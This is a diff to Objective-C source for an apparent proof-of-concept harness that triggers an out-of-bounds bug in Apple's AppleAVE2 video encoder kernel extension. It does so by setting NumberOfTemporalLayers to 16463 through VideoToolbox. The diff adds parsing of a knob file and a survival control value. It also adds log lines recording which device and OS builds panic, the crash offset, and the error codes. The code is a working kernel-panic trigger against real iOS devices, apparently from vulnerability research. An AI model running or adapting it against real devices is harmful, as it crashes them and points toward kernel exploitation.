@@ -32,7 +32,7 @@
 #import <stdlib.h>
 #import <unistd.h>
 
-#define P142_BUILD   @"p142-avetemporal-v4-stage9"
+#define P142_BUILD   @"p142-avetemporal-v5-honesty"
 #define P142_KEY     @"NumberOfTemporalLayers"
 #define P142_DEFAULT 16463         /* the PoC's trigger threshold */
 #define P142_SURVIVE 16462         /* the PoC's surviving value */
@@ -80,20 +80,35 @@ static void p142_bandit(const char *outcome) {
     L(@"  added the -12900 pre-check). The lab's fill-store conversion class");
     L(@"  (the p088/p112 geometry) with a LIVE count knob.");
     L(@"[!] PANIC-POSSIBLE BY DESIGN = the count-law receipt; ONE encode");
-    L(@"  per tap; knob value = Documents/p142_layers.txt (decimal; 0 =");
-    L(@"  the 16462 survival control, blank = 16463 the PoC row).");
+    L(@"  per tap; knob = Documents/p142_layers.txt (decimal).");
+    L(@"  blank = 16463 PoC row. 0 = 16462 survival. 16463 = panic row.");
+    L(@"  1..16461 cannot hit the OOB (09:06 live: layers=18 readback=1).");
+    L(@"  T8150 24A435: rc=-12900 is VT RCMode=20 miss, NOT the 27.2 NTL");
+    L(@"  kernel pre-check. Nov 1 panics (5x, videocodecd, AppleAVE2");
+    L(@"  913.43.1 +0xDA78 far=0x59) fired with that same rc=-12900.");
+    L(@"  readback=1 on T8150 = VT store law; the internal count still");
+    L(@"  reaches AVE2. Hunt 12 23F77 never panics = different AVE2.");
 
-    /* the knob */
+    /* the knob — 0 is the survival control (code used to ignore it). */
     long layers = P142_DEFAULT;
     NSString *knob = [NSString stringWithContentsOfFile:
         [docs stringByAppendingPathComponent:@"p142_layers.txt"]
         encoding:NSUTF8StringEncoding error:nil];
     if (knob) {
         long v = strtol(knob.UTF8String, NULL, 10);
-        if (v > 0) layers = v;
-        Lf(@"[*] knob file present: layers=%ld", layers);
+        if (v == 0) layers = P142_SURVIVE;
+        else if (v > 0) layers = v;
+        Lf(@"[*] knob file present: parsed=%ld layers=%ld%@",
+           v, layers, (v == 0) ? @" (0 → 16462 survival)" : @"");
     } else {
         Lf(@"[*] no knob file: layers=%ld (the PoC row)", layers);
+    }
+    if (layers > 0 && layers < P142_SURVIVE) {
+        Lf(@"[HOLD] layers=%ld < 16462 — this count cannot hit the 16463 OOB.",
+           layers);
+        L(@"  Delete Documents/p142_layers.txt (or write 16463) for the panic");
+        L(@"  row; write 0 for the 16462 survival control. Encode still runs");
+        L(@"  so the receipt is visible.");
     }
 
     id<NSObject> nothing = nil; (void)nothing;   /* clang tidy */
@@ -129,6 +144,16 @@ static void p142_bandit(const char *outcome) {
     CFRelease(val);
     Lf(@"[2] usage st=%d rc st=%d SetProperty(NumberOfTemporalLayers=%ld)"
        @" st=%d", (int)sUsage, (int)sRC, layers, (int)st);
+    if (sRC == -12900) {
+        L(@"[law] rc st=-12900 = VT RCMode=20 property miss on this build.");
+        L(@"  27.2 kernel pre-check returns -12900 on NumberOfTemporalLayers");
+        L(@"  itself (ntl st). ntl st=0 here = 27.0 still accepts the count.");
+        L(@"  Nov 1 T8150 panics used this same rc=-12900 + N=16463.");
+    }
+    if ((int)st == -12900) {
+        L(@"[law] ntl st=-12900 = 27.2-class kernel pre-check (this SKU");
+        L(@"  should not show that on 24A435).");
+    }
 
     /* the readback: the stage9 row */
     {
@@ -138,8 +163,14 @@ static void p142_bandit(const char *outcome) {
         if (rst == 0 && rb) {
             int32_t rv = 0; CFNumberGetValue((CFNumberRef)rb,
                                              kCFNumberSInt32Type, &rv);
-            Lf(@"[2c] readback = %d (16463 = the RAW path accepted it;"
-               @" 1 = the clamp law; 0 = dropped)", rv);
+            Lf(@"[2c] readback = %d (16463 = VT stored the raw count;"
+               @" 1 = VT store clamp; 0 = dropped)", rv);
+            if (rv == 1 && layers > 1) {
+                L(@"[law] readback=1 is VT's store. T8150 24A435 still delivers");
+                L(@"  the internal count to AppleAVE2 (Nov 1: 5 panics at");
+                L(@"  +0xDA78 far=0x59 with readback-class clamp). Hunt 12");
+                L(@"  23F77 stays at readback=1 with no panic = other kext.");
+            }
             CFRelease(rb);
         } else {
             Lf(@"[2c] readback st=%d", (int)rst);
